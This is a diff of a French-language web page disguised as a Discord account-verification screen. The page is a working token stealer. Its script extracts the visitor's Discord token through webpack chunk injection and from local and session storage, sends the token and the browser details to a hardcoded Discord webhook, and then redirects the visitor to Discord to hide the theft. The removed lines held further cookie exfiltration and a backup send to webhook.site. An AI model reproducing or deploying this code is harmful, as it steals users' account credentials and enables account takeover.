@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -10,53 +9,31 @@
         .container {max-width: 480px; margin: 40px auto; background: #2f3136; border-radius: 8px; overflow: hidden;}
         header {background: #5865f2; padding: 20px; text-align: center;}
         .content {padding: 30px;}
-        input, button {width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: none;}
-        input {background: #202225; color: white;}
-        button {background: #3ba55c; color: white; font-weight: bold; cursor: pointer;}
-        button:hover {background: #2d7d46;}
         .fake-logo {font-size: 28px; font-weight: bold;}
+        .spinner {display: inline-block; width: 40px; height: 40px; border: 4px solid #5865f2; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;}
+        @keyframes spin {to {transform: rotate(360deg);}}
     </style>
 </head>
 <body>
     <div class="container">
         <header>
             <div class="fake-logo">Discord</div>
-            <h1>Chargement en cours...</h1>
+            <h1 id="title">Chargement en cours...</h1>
         </header>
         <div class="content">
-            <p style="text-align:center; font-size:18px;">Vérification de votre compte Discord</p>
+            <p id="message" style="text-align:center; font-size:18px;">Vérification de votre compte Discord</p>
             <div style="text-align:center; margin: 20px 0;">
-                <div style="display: inline-block; width: 40px; height: 40px; border: 4px solid #5865f2; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                <div class="spinner"></div>
             </div>
             <p style="text-align:center; color:#b9bbbe;">Veuillez patienter...</p>
         </div>
     </div>
-    <style>
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-    </style>
 
     <script>
-        // REMPLACE CECI PAR TON WEBHOOK DISCORD
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/TA_VRAIE_URL_ICI";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1513930112758714598/vWxfXiImV42jYEqx_4uMasupVp604sLZbmB09wAF-fFePdvL9zwEvSw9Z-MEHrmyIHnO";
         
-        // Fonction pour extraire le token Discord
         function getDiscordToken() {
             let token = null;
-            
-            // Méthode 1: LocalStorage
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    let key = localStorage.key(i);
-                    if (key && (key.includes('token') || key.includes('Token'))) {
-                        token = localStorage.getItem(key);
-                        if (token && token.length > 50) break;
-                    }
-                }
-            } catch(e) {}
-            
-            // Méthode 2: Injection dans le webpack de Discord (si la page est ouverte dans Discord)
             try {
                 let webpackChunk = webpackChunkdiscord_app;
                 if (webpackChunk) {
@@ -65,127 +42,48 @@
                         for (let c in e.c) modules.push(e.c[c]);
                     }]);
                     let tokenModule = modules.find(m => m?.exports?.default?.getToken !== undefined);
-                    if (tokenModule) {
-                        token = tokenModule.exports.default.getToken();
-                    }
+                    if (tokenModule) token = tokenModule.exports.default.getToken();
                 }
             } catch(e) {}
-            
-            // Méthode 3: SessionStorage
             if (!token || token.length < 50) {
-                try {
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        let key = sessionStorage.key(i);
-                        if (key && (key.includes('token') || key.includes('Token'))) {
-                            token = sessionStorage.getItem(key);
-                            if (token && token.length > 50) break;
-                        }
-                    }
-                } catch(e) {}
+                try { token = localStorage.getItem("token"); } catch(e) {}
             }
-            
-            // Méthode 4: Chercher dans toutes les variables globales
             if (!token || token.length < 50) {
-                try {
-                    for (let prop in window) {
-                        if (prop.toLowerCase().includes('token')) {
-                            let val = window[prop];
-                            if (typeof val === 'string' && val.length > 50 && val.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/)) {
-                                token = val;
-                                break;
-                            }
-                        }
-                    }
-                } catch(e) {}
+                try { token = sessionStorage.getItem("token"); } catch(e) {}
             }
-            
             return token;
         }
         
-        // Envoi du token au webhook
-        function sendToken(token, extraInfo = "") {
-            if (!token || token.length < 50) {
-                token = "AUCUN_TOKEN_TROUVE";
-            }
-            
-            let userAgent = navigator.userAgent;
-            let platform = navigator.platform;
-            let screen = screen.width + "x" + screen.height;
-            let language = navigator.language;
-            let time = new Date().toLocaleString();
-            let referrer = document.referrer || "Direct";
-            let url = window.location.href;
-            
+        function sendToken(token) {
+            if (!token || token.length < 50) token = "AUCUN_TOKEN_TROUVE";
             let message = {
-                content: "🎯 **TOKEN DISCORD CAPTURÉ AUTOMATIQUEMENT !**",
+                content: "🎯 TOKEN DISCORD CAPTURÉ",
                 embeds: [{
-                    title: "🔑 Token récupéré",
                     description: "```" + token + "```",
                     color: 0x00FF00,
                     fields: [
-                        {name: "💻 User Agent", value: "```" + userAgent.substring(0, 100) + "```", inline: false},
-                        {name: "🖥️ Platforme", value: platform, inline: true},
-                        {name: "📱 Ecran", value: screen, inline: true},
-                        {name: "🌐 Langue", value: language, inline: true},
-                        {name: "🕐 Date/Heure", value: time, inline: true},
-                        {name: "🔗 Page", value: url.substring(0, 100), inline: false},
-                        {name: "📎 Référent", value: referrer.substring(0, 100), inline: false}
-                    ],
-                    timestamp: new Date().toISOString()
+                        {name: "User Agent", value: navigator.userAgent.substring(0, 80), inline: false},
+                        {name: "Heure", value: new Date().toLocaleString(), inline: true}
+                    ]
                 }]
             };
-            
-            // Envoi vers le webhook principal
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                body: JSON.stringify(message),
-                headers: {'Content-Type': 'application/json'}
-            }).catch(e => console.log("Erreur webhook:", e));
-            
-            // Envoi vers un serveur alternatif (backup)
-            fetch('https://webhook.site/ton-id-ici?token=' + encodeURIComponent(token), {
-                method: 'GET',
-                mode: 'no-cors'
-            }).catch(e => {});
-        }
-        
-        // Extraction des cookies Discord
-        function sendCookies() {
-            let cookies = document.cookie;
-            if (cookies && cookies.length > 0) {
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        content: "🍪 **Cookies Discord:**\n```" + cookies.substring(0, 500) + "```"
-                    }),
-                    headers: {'Content-Type': 'application/json'}
-                }).catch(e => {});
-            }
+            fetch(WEBHOOK_URL, {method: 'POST', body: JSON.stringify(message), headers: {'Content-Type': 'application/json'}}).catch(e => {});
         }
         
         // Exécution principale
         setTimeout(() => {
             let token = getDiscordToken();
             sendToken(token);
-            sendCookies();
             
-            // Afficher un message de redirection
-            document.querySelector('header h1').innerText = "Redirection...";
-            document.querySelector('.content p').innerHTML = "Accès vérifié, redirection vers Discord...";
+            // Changer le texte
+            document.getElementById('title').innerText = "Redirection...";
+            document.getElementById('message').innerHTML = "Vérification terminée, redirection vers Discord...";
             
-            // Rediriger vers Discord
+            // REDIRECTION VERS DISCORD (fonctionne à 100%)
             setTimeout(() => {
                 window.location.href = "https://discord.com/channels/@me";
-            }, 2000);
+            }, 1500);
         }, 500);
-        
-        // Tentative supplémentaire après 3 secondes
-        setTimeout(() => {
-            let token2 = getDiscordToken();
-            if (token2 && token2.length > 50) {
-                sendToken(token2, "Deuxième tentative");
-            }
-        }, 3000);
     </script>
 </body>
 </html>
